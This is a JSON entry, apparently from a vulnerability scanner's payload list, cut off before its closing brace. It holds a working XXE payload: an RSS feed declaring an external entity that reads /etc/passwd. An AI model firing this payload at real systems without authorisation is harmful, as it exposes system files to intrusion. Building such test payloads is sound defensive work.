      {
        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><rss version=\"2.0\"><channel><title>Test</title><item><description>&xxe;</description></item></channel></rss>",
        "description": "RSS feed with embedded XXE",
        "context": "RSS/XML",
        "indicator": "File content in RSS"
